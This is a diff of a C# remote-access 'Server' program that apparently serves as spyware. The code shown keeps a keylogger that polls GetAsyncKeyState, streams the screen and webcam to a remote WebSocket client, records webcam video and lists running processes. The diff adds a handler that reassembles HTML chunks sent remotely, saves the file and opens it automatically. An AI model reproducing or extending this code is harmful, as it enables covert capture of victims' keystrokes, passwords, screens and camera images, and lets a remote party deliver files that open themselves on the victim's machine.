@@ -23,37 +23,50 @@ namespace Server
 {
     class Program
     {
-        // Config
+        // CONFIG
         static int port = 8080;
 
-        // Keylogger
+        // KEYLOGGER
         static StringBuilder keyBuffer = new StringBuilder();
         static object keyLogLock = new object();
         static bool isRecording = false;
-        WebSocket globalWS = null;
 
-        // Stream control
-        static bool isStreaming = true;
-
-        // WebSocket for the currently-connected client (single client scenario)
-        // If bạn muốn nhiều client, đổi thành List<WebSocket>
+        // WEBSOCKET STATE (single client)
         static WebSocket currentWs = null;
         static CancellationTokenSource streamingCts = null;
-        static WebcamForm webcamForm = null;
-        enum StreamMode{Screen,Webcam}
+
+        // STREAMING CONTROL
+        static bool isStreaming = true;
         static StreamMode currentStreamMode = StreamMode.Screen;
+        enum StreamMode { Screen, Webcam }
+
+        // SCREEN STREAM
+        static byte[] blackCache = null;
+
+        // WEBCAM STREAM & RECORD
         static VideoCaptureDevice webcam;
         static Bitmap lastWebcamFrame;
         static object webcamLock = new object();
+
         static bool isRecordingWebcam = false;
         static VideoFileWriter recWriter;
-        static DateTime recStartTime;
         static string recPath;
-        static Stopwatch recWatch = new Stopwatch();
 
+        static Stopwatch recWatch = new Stopwatch();
         static bool recStarted = false;
         static TimeSpan recDuration = TimeSpan.Zero;
         static int recTargetSeconds = 0;
+        static DateTime recStartTime;
+
+        // HTML FILE TRANSFER
+        static List<string> _htmlChunks = null;
+        static int _htmlTotal = 0;
+
+        // UI / FORM
+        static WebcamForm webcamForm = null;
+
+        // WEBSOCKET
+        WebSocket globalWS = null;
 
         // P/Invoke
         [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
@@ -100,7 +113,9 @@ namespace Server
                 }
             }
         }
-
+        // ======================================================
+        // =============== WEBSOCKET CLIENT =====================
+        // ======================================================
         static async Task HandleWsClient(HttpListenerContext ctx)
         {
             WebSocket ws = (await ctx.AcceptWebSocketAsync(null)).WebSocket;
@@ -122,24 +137,38 @@ namespace Server
             {
                 while (ws.State == WebSocketState.Open)
                 {
-                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
+                    StringBuilder sb = new StringBuilder();
+                    WebSocketReceiveResult result;
 
-                    if (result.MessageType == WebSocketMessageType.Close)
+                    // 🔒 GHÉP FRAME ĐẾN KHI END
+                    do
                     {
-                        await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
-                        break;
-                    }
+                        result = await ws.ReceiveAsync(
+                            new ArraySegment<byte>(buffer),
+                            CancellationToken.None
+                        );
 
-                    // Assume text messages are commands (your HTML sends text)
-                    if (result.MessageType == WebSocketMessageType.Text)
-                    {
-                        string msg = Encoding.UTF8.GetString(buffer, 0, result.Count);
-                        await HandleCommand(ws, msg);
-                    }
-                    else if (result.MessageType == WebSocketMessageType.Binary)
-                    {
-                        // If you ever want to receive binary frames from client
-                    }
+                        if (result.MessageType == WebSocketMessageType.Close)
+                        {
+                            await ws.CloseAsync(
+                                WebSocketCloseStatus.NormalClosure,
+                                "Closing",
+                                CancellationToken.None
+                            );
+                            return;
+                        }
+
+                        sb.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
+
+                    } while (!result.EndOfMessage);
+
+                    string msg = sb.ToString();
+
+                    if (await HandleHtmlPart(ws, msg))
+
+                        continue;
+
+                    await HandleCommand(ws, msg);
                 }
             }
             catch (Exception ex)
@@ -156,7 +185,9 @@ namespace Server
             currentWs = null;
             Console.WriteLine("Client disconnected.");
         }
-
+        // ======================================================
+        // ====================== COMMAND =======================
+        // ======================================================
         static async Task HandleCommand(WebSocket ws, string msg)
         {
             try
@@ -347,7 +378,7 @@ namespace Server
                     string base64 = msg.Substring(5);
 
                     string savePath = SaveHtmlFile(base64);
-                    // nho Ó mo file!
+                  
                     OpenFileWithOS(savePath);
 
                     await SendText(ws, "SYS|HTML_SENT");
@@ -365,15 +396,18 @@ namespace Server
                 await SendText(ws, "ERR|" + ex.Message);
             }
         }
-
+        // ======================================================
+        // ====================== SENDTEXT ======================
+        // ======================================================
         static async Task SendText(WebSocket ws, string text)
         {
             if (ws == null || ws.State != WebSocketState.Open) return;
             byte[] data = Encoding.UTF8.GetBytes(text);
             await ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None);
         }
-
-        // Streaming loop: sends LIVE|base64 frames to the provided websocket while connected.
+        // ======================================================
+        // =============== STREAMING (SCREEN / WEBCAM) ==========
+        // ======================================================
         static async Task StartStreamingLoop(WebSocket ws, CancellationToken ct)
         {
             Console.WriteLine("Start streaming loop.");
@@ -401,7 +435,6 @@ namespace Server
 
                     else
                     {
-                        // gửi khung đen mỗi ~300ms để xóa hình cũ
                         byte[] black = CreateBlackJpeg();
                         string b64 = Convert.ToBase64String(black);
                         await SendText(ws, "LIVE|" + b64);
@@ -434,7 +467,6 @@ namespace Server
             }
         }
 
-        static byte[] blackCache = null;
         static byte[] CreateBlackJpeg()
         {
             if (blackCache != null) return blackCache;
@@ -448,8 +480,9 @@ namespace Server
                 return blackCache;
             }
         }
-
-        // Keylogger loop (giữ nguyên từ bạn)
+        // ======================================================
+        // =================== KEYLOGGER ========================
+        // ======================================================
         static void KeyloggerLoop()
         {
             bool[] keyState = new bool[256];
@@ -488,8 +521,9 @@ namespace Server
                 }
             }
         }
-
-        // Helper process lists
+        // ======================================================
+        // ================= PROCESS / APP LIST =================
+        // ======================================================
         static string GetRunningApps()
         {
             StringBuilder sb = new StringBuilder();
@@ -515,7 +549,9 @@ namespace Server
             return sb.ToString();
         }
 
-        // Keep your CaptureScreen (dialog) if you still want to use it
+        // ======================================================
+        // =================== SNAP ===========================
+        // ======================================================
         public static void CaptureScreen()
         {
             Thread t = new Thread(() =>
@@ -543,7 +579,9 @@ namespace Server
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
         }
-
+        // ======================================================
+        // =================== WEBCAM ===========================
+        // ======================================================
         public static async Task StartWebcamRec(int seconds, WebSocket ws)
         {
             InitWebcam();
@@ -647,8 +685,9 @@ namespace Server
                 }
             }
         }
-
-
+        // ======================================================
+        // ================= HTML TRANSFER ======================
+        // ======================================================
         static string SaveHtmlFile(string base64)
         {
             byte[] data = Convert.FromBase64String(base64);
@@ -670,7 +709,57 @@ namespace Server
 
             return path;
         }
+        static async Task<bool> HandleHtmlPart(WebSocket ws, string msg)
+        {
+            if (!msg.StartsWith("HTML_PART|"))
+                return false;
 
+            // HTML_PART|index|total|<base64>
+            int p1 = msg.IndexOf('|', 10);
+            int p2 = msg.IndexOf('|', p1 + 1);
+
+            if (p1 < 0 || p2 < 0)
+            {
+                await SendText(ws, "ERR|Invalid HTML_PART format");
+                return true;
+            }
+
+            int index = int.Parse(msg.Substring(10, p1 - 10));
+            int total = int.Parse(msg.Substring(p1 + 1, p2 - p1 - 1));
+            string data = msg.Substring(p2 + 1);
+
+            if (_htmlChunks == null)
+            {
+                _htmlTotal = total;
+                _htmlChunks = new List<string>(new string[total]);
+            }
+
+            _htmlChunks[index] = data;
+
+            if (!_htmlChunks.Contains(null))
+            {
+                string fullBase64 = string.Concat(_htmlChunks);
+
+                _htmlChunks = null;
+                _htmlTotal = 0;
+
+                try
+                {
+                    string path = SaveHtmlFile(fullBase64);
+                    OpenFileWithOS(path);
+                    await SendText(ws, "SYS|HTML_SENT");
+                }
+                catch (Exception ex)
+                {
+                    await SendText(ws, "ERR|" + ex.Message);
+                }
+            }
+
+            return true;
+        }
+        // ======================================================
+        // ================== UTIL / FILE =======================
+        // ======================================================
         static void OpenFileWithOS(string filePath)
         {
             try
@@ -707,10 +796,7 @@ namespace Server
                 $"[{DateTime.Now:HH:mm:ss}]{Environment.NewLine}{content}",
                 Encoding.UTF8
             );
-
             return path;
         }
-
-
     }
 }
